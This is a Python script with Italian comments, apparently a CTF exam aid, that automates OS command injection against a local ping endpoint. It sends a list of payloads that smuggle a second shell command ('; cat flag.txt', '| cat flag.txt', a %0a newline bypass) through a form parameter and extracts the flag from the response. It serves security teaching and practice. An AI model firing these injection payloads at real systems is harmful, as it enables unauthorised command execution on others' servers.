#!/usr/bin/env python3
"""
PRONTUARIO #08: Command Injection CTF Solver
-------------------------------------------
Modulo: Web Security / Injection Attacks
Descrizione: Script di test e risoluzione automatizzata per challenge d'esame
            basate su OS Command Injection (ping, form web, parametri HTTP).
"""

import requests

# ==================== INPUT DATI D'ESAME ====================
TARGET_URL = "http://127.0.0.1:5000/ping"  # URL dell'endpoint vulnerabile
PARAM_NAME = "host"                         # Nome del parametro HTML/form (es. 'host', 'ip', 'cmd')
HTTP_METHOD = "POST"                       # Metodo HTTP: "POST" oppure "GET"

# LISTA PAYLOAD METACARATTERI SHELL (Linux)
CMD_PAYLOADS = [
    "127.0.0.1; cat flag.txt",
    "127.0.0.1 | cat flag.txt",
    "127.0.0.1 & cat flag.txt",
    "127.0.0.1%0acat flag.txt",             # Newline (%0a) per bypassare filtri inline
    "; cat flag.txt",
    "| cat flag.txt"
]
# ============================================================


def send_payload(url: str, method: str, param: str, payload: str):
    """Invia la richiesta HTTP GET o POST al server d'esame."""
    if method.upper() == "POST":
        return requests.post(url, data={param: payload}, timeout=5)
    else:
        return requests.get(url, params={param: payload}, timeout=5)


def main():
    print(f"[*] Avvio Command Injection Solver su Target: {TARGET_URL}")
    print(f"[*] Parametro analizzato: '{PARAM_NAME}' (Metodo: {HTTP_METHOD})\n")

    found = False
    for payload in CMD_PAYLOADS:
        print(f"[*] Testing Payload: {payload}")
        try:
            response = send_payload(TARGET_URL, HTTP_METHOD, PARAM_NAME, payload)

            # Analisi della risposta alla ricerca del formato flag{...}
            if response.status_code == 200 and "flag{" in response.text:
                print("\n=== COMMAND INJECTION RIUSCITA! ===")
                print(f" Payload Vincente : {payload}")
                
                start_idx = response.text.find("flag{")
                end_idx = response.text.find("}", start_idx) + 1
                flag = response.text[start_idx:end_idx]
                
                print(f" Flag Trovata     : {flag}")
                print("===================================\n")
                found = True
                break

        except Exception as e:
            print(f"[!] Errore di connessione: {e}")

    if not found:
        print("[!] Nessun payload ha estratto la flag. Verificare il nome del parametro o l'endpoint.")


if __name__ == "__main__":
    main()
